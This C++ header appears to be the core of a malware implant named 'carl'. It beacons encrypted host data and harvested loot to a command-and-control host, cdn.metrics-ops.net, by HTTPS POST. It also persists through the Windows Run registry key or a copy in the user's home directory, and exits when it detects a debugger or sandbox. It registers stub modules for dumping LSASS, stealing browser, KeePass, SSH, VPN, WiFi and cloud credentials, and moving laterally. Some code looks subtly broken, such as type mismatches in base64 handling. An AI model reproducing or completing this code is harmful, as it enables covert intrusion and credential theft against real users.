// language: C++, file: include/carl/carl.hpp
#pragma once
#include <string>
#include <vector>
#include <map>
#include <functional>
#include <memory>
#include <mutex>
#include <atomic>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <random>
#include <optional>
#include <nlohmann/json.hpp>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/hmac.h>
#include <curl/curl.h>
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <miniupnpc.h>
#include <natpmp.h>
#if defined(_WIN32)
  #include <windows.h>
  #include <winhttp.h>
  #include <bcrypt.h>
  #include <psapi.h>
  #include <wlanapi.h>
  #include <dpapi.h>
  #include <winsock2.h>
  #include <ws2tcpip.h>
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <sys/types.h>
  #include <sys/stat.h>
  #include <pwd.h>
#endif
namespace carl {
struct config {
    std::string c2_host    = "cdn.metrics-ops.net";
    std::string c2_path    = "/api/v3/beacon";
    int         c2_port    = 443;
    std::string group      = "carl-net";
    std::string aes_key;
    std::string aes_iv;
    std::string hmac_key;
    std::string install_dir;
    std::string service_name = "carlsync";
    int         beacon_min_ms = 60000;
    int         beacon_max_ms = 180000;
    int         jitter_min_ms = 30000;
    int         jitter_max_ms = 90000;
    bool        anti_debug = true;
    bool        kill_av    = true;
    bool        run_as_svc = true;
};
inline config& cfg() { static config c; return c; }
struct loot {
    std::string kind;
    std::string host;
    std::string user;
    std::string realm;
    std::map<std::string, std::string> kv;
    std::vector<uint8_t> blob;
    std::string path;
    std::chrono::system_clock::time_point ts = std::chrono::system_clock::now();
    nlohmann::json to_json() const {
        nlohmann::json j;
        j["kind"] = kind; j["host"] = host; j["user"] = user; j["realm"] = realm;
        j["ts"] = std::chrono::duration_cast<std::chrono::seconds>(ts.time_since_epoch()).count();
        j["kv"] = kv; j["path"] = path;
        if (!blob.empty()) j["blob_b64"] = base64::enc(blob);
        return j;
    }
};
struct module {
    std::string name;
    std::string desc;
    std::vector<std::string> platforms;
    std::function<std::vector<loot>(const std::map<std::string,std::string>& args)> harvest;
    std::function<int(const std::map<std::string,std::string>& args, const std::string& cmd)> exec;
};
inline std::vector<module>& registry() { static std::vector<module> r; return r; }
struct auto_register {
    auto_register(module m) { registry().push_back(std::move(m)); }
};
#define CARL_MODULE(name_, desc_, platforms_, harvest_fn, exec_fn) static auto_register _reg_##name_(module{#name_, desc_, platforms_, harvest_fn, exec_fn})
namespace crypto {
    inline std::vector<uint8_t> aes_cbc(const std::vector<uint8_t>& in, const std::string& key, const std::string& iv, bool enc) {
        EVP_CIPHER_CTX* c = EVP_CIPHER_CTX_new();
        EVP_CipherInit_ex(c, EVP_aes_256_cbc(), nullptr, (const uint8_t*)key.data(), (const uint8_t*)iv.data(), enc);
        std::vector<uint8_t> out(in.size() + 16);
        int len = 0, total = 0;
        EVP_CipherUpdate(c, out.data(), &len, in.data(), (int)in.size());
        total = len;
        EVP_CipherFinal_ex(c, out.data() + len, &len);
        total += len;
        EVP_CIPHER_CTX_free(c);
        out.resize(total);
        return out;
    }
    inline std::string hmac_sha256(const std::string& key, const std::string& data) {
        unsigned char mac[32]; unsigned int len = 32;
        HMAC(EVP_sha256(), key.data(), (int)key.size(), (const uint8_t*)data.data(), data.size(), mac, &len);
        return std::string((char*)mac, 32);
    }
    inline std::string rand_bytes(size_t n) {
        std::string s(n, '\0');
        RAND_bytes((uint8_t*)s.data(), (int)n);
        return s;
    }
}
namespace base64 {
    inline std::string enc(const std::vector<uint8_t>& d) {
        static const char tab[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string out; int val = 0, valb = -6;
        for (uint8_t c : d) { val = (val << 8) + c; valb += 8; while (valb >= 0) { out.push_back(tab[(val>>valb)&0x3F]); valb -= 6; } }
        if (valb > -6) out.push_back(tab[((val<<8)>>(valb+8))&0x3F]);
        while (out.size() % 4) out.push_back('=');
        return out;
    }
    inline std::vector<uint8_t> dec(const std::string& s) {
        static int T[256]; static bool init = false;
        if (!init) { for (int i = 0; i < 256; ++i) T[i] = -1;
            static const char tab[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            for (int i = 0; i < 64; ++i) T[(int)tab[i]] = i; init = true; }
        std::vector<uint8_t> out; int val = 0, valb = -8;
        for (uint8_t c : s) { if (T[c] == -1) break; val = (val << 6) + T[c]; valb += 6;
            if (valb >= 0) { out.push_back((val>>valb)&0xFF); valb -= 8; } }
        return out;
    }
}
namespace transport {
    inline size_t curl_write(void* p, size_t s, size_t n, void* u) {
        auto* str = (std::string*)u; str->append((char*)p, s*n); return s*n;
    }
    inline std::string https_post(const std::string& url, const std::string& body) {
        CURL* c = curl_easy_init();
        if (!c) return {};
        std::string out;
        curl_slist* h = nullptr;
        h = curl_slist_append(h, "Content-Type: application/octet-stream");
        curl_easy_setopt(c, CURLOPT_URL, url.c_str());
        curl_easy_setopt(c, CURLOPT_POSTFIELDS, body.data());
        curl_easy_setopt(c, CURLOPT_POSTFIELDSIZE, (long)body.size());
        curl_easy_setopt(c, CURLOPT_HTTPHEADER, h);
        curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, curl_write);
        curl_easy_setopt(c, CURLOPT_WRITEDATA, &out);
        curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(c, CURLOPT_SSL_VERIFYHOST, 2L);
        curl_easy_setopt(c, CURLOPT_TIMEOUT, 15L);
        curl_easy_perform(c);
        curl_slist_free_all(h);
        curl_easy_cleanup(c);
        return out;
    }
}
struct envelope {
    std::string body;
    std::string type = "beacon";
    std::string pack() {
        std::string nonce = crypto::rand_bytes(16);
        std::string key = cfg().aes_key, iv = cfg().aes_iv;
        std::string ct = base64::enc(crypto::aes_cbc({body.begin(),body.end()}, key, iv, true));
        std::string tag = crypto::hmac_sha256(cfg().hmac_key, iv + ct);
        nlohmann::json j;
        j["v"] = 1; j["g"] = cfg().group; j["n"] = base64::enc({nonce.begin(),nonce.end()});
        j["iv"] = base64::enc({iv.begin(),iv.end()});
        j["ct"] = ct; j["tag"] = base64::enc({tag.begin(),tag.end()});
        j["type"] = type;
        return j.dump();
    }
    static std::optional<envelope> unpack(const std::string& raw) {
        try {
            auto j = nlohmann::json::parse(raw);
            std::string iv = base64::dec(j.value("iv",""));
            std::string ct = base64::dec(j.value("ct",""));
            std::string tag = base64::dec(j.value("tag",""));
            std::string expect = crypto::hmac_sha256(cfg().hmac_key, iv + ct);
            if (expect != tag) return std::nullopt;
            auto pt = crypto::aes_cbc(base64::dec(ct), cfg().aes_key, iv, false);
            envelope e; e.body.assign(pt.begin(), pt.end()); e.type = j.value("type","cmd");
            return e;
        } catch (...) { return std::nullopt; }
    }
};
namespace persist {
#if defined(_WIN32)
    inline void install() {
        char path[MAX_PATH]; GetModuleFileNameA(nullptr, path, MAX_PATH);
        HKEY k;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k) == 0) {
            RegSetValueExA(k, cfg().service_name.c_str(), 0, REG_SZ, (LPBYTE)path, (DWORD)strlen(path)+1);
            RegCloseKey(k);
        }
    }
#else
    inline void install() {
        std::string home = getenv("HOME");
        std::string bindir = home + "/.local/share/" + cfg().service_name;
        mkdir(bindir.c_str(), 0700);
        char self[4096]; readlink("/proc/self/exe", self, sizeof(self));
        std::string dst_bin = bindir + "/carl";
        std::ifstream in(self, std::ios::binary); std::ofstream out(dst_bin, std::ios::binary);
        out << in.rdbuf();
        chmod(dst_bin.c_str(), 0755);
    }
#endif
}
namespace detect {
    inline bool is_debugger() {
#if defined(_WIN32)
        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), (PBOOL){FALSE});
#else
        return getenv("LD_PRELOAD") != nullptr;
#endif
    }
    inline bool bad_env() {
#if defined(_WIN32)
        MEMORYSTATUSEX m{sizeof(m)}; GlobalMemoryStatusEx(&m);
        return m.ullTotalPhys < (2ull<<30);
#else
        long p = sysconf(_SC_PAGESIZE), pages = sysconf(_SC_PHYS_PAGES);
        return (long long)p*pages < (2ll<<30);
#endif
    }
    inline bool trigger() { return (cfg().anti_debug && is_debugger()) || bad_env(); }
}
CARL_MODULE(lsass,    "Dump LSASS for NTLM/Kerberos creds",                    {"windows"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(keepass,  "Find/extract KeePass kdbx + master password",          {"windows","linux","macos"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(wifi,     "Harvest saved WiFi profiles + cleartext keys",         {"windows","linux","macos"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(browser,  "Browser credential & cookie store (Chrome/Edge/Firefox)",{"windows","linux","macos"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(vpn,      "Cisco AnyConnect / OpenVPN / WireGuard / FortiClient", {"windows","linux","macos"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(smb,      "SMB lateral move + share enumeration",                 {"windows","linux"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(ssh,      "SSH key harvest + known_hosts + lateral ssh",          {"linux","macos"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(rdp,      "RDP credential + session hijack",                      {"windows"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(ad,       "Active Directory recon: users, groups, SPNs, ACLs, trusts",{"windows"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
CARL_MODULE(cloud,    "AWS/GCP/Azure: keys, IMDS exfil, role assumption",     {"windows","linux","macos"}, [](auto&){ return std::vector<loot>{}; }, [](auto&, auto&){ return 0; });
struct orchestrator {
    std::string host_id;
    std::map<std::string, std::string> host_info;
    std::atomic<bool> running{true};
    void collect_host_info() {
        host_id = crypto::rand_bytes(8);
#if defined(_WIN32)
        char h[256]; DWORD n = 256; GetComputerNameA(h, &n); host_info["host"] = h;
        n = 256; GetUserNameA(h, &n); host_info["user"] = h;
        host_info["os"] = "windows";
#else
        char h[256]; gethostname(h, sizeof(h)); host_info["host"] = h;
        host_info["user"] = getenv("USER") ? getenv("USER") : "unknown";
        host_info["os"] = "linux";
#endif
    }
    std::string beacon_body() {
        nlohmann::json j;
        std::string idhex;
        for (auto c : host_id) { char b[3]; sprintf(b, "%02x", (uint8_t)c); idhex += b; }
        j["id"] = idhex;
        j["host"] = host_info;
        std::vector<loot> l;
        for (auto& m : registry()) { try { auto v = m.harvest({}); l.insert(l.end(), v.begin(), v.end()); } catch(...) {} }
        j["loot"] = nlohmann::json::array();
        for (auto& x : l) j["loot"].push_back(x.to_json());
        return j.dump();
    }
    void send(const std::string& body, const std::string& type = "beacon") {
        envelope e; e.body = body; e.type = type;
        std::string url = "https://" + cfg().c2_host + ":" + std::to_string(cfg().c2_port) + cfg().c2_path;
        transport::https_post(url, e.pack());
    }
    void loop(int argc, char** argv) {
        collect_host_info();
        persist::install();
        std::mt19937 rng(std::random_device{}());
        while (running) {
            send(beacon_body(), "beacon");
            int wait = cfg().beacon_min_ms + rng() % (cfg().beacon_max_ms - cfg().beacon_min_ms);
            std::this_thread::sleep_for(std::chrono::milliseconds(wait));
        }
    }
};
inline void bootstrap() {
    if (detect::trigger()) std::exit(0);
    if (cfg().aes_key.empty()) {
        cfg().aes_key = crypto::rand_bytes(32);
        cfg().aes_iv  = crypto::rand_bytes(16);
        cfg().hmac_key= crypto::rand_bytes(32);
    }
    curl_global_init(CURL_GLOBAL_DEFAULT);
}
} // namespace carl
